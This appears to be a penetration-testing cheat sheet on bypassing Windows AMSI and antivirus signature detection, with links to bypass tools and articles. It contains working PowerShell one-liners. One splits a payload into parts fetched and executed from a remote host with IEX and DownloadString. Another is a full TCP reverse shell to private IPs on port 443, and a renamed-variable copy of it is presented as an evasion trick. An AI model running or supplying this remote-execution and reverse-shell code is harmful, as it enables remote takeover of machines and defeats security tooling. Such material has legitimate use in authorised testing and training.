## Testing for Amsi Bypass:

- https://github.com/rasta-mouse/AmsiScanBufferBypass

## Amsi-Bypass-Powershell

- https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

## Resources:

- https://blog.f-secure.com/hunting-for-amsi-bypasses/
- https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
- https://github.com/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans
- https://slaeryan.github.io/posts/falcon-zero-alpha.html
- https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/


A simple trick To bypass Signature => is to split the script to different files and call them 1 by 1 :)

Something like this:

```
IEX (New-Object System.Net.WebClient).DownloadString("http://192.168.26.141/part1.ps1");IEX (New-Object System.Net.WebClient).DownloadString("http://192.168.26.141/part2.ps1");IEX (New-Object System.Net.WebClient).DownloadString("http://192.168.26.141/part3.ps1");
```



One trick to bypass it (at least at the time of this writing) is to get PowerShell #2 from [revshells.com](https://www.revshells.com/) and change all the variable names.

So:

```
$client = New-Object System.Net.Sockets.TCPClient('192.168.49.57',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Becomes:

```
$c = New-Object Net.Sockets.TCPClient('10.10.14.6',443);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$ssb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($ssb,0,$ssb.Length);$s.Flush()};$c.Close(
```

Save as run.ps1 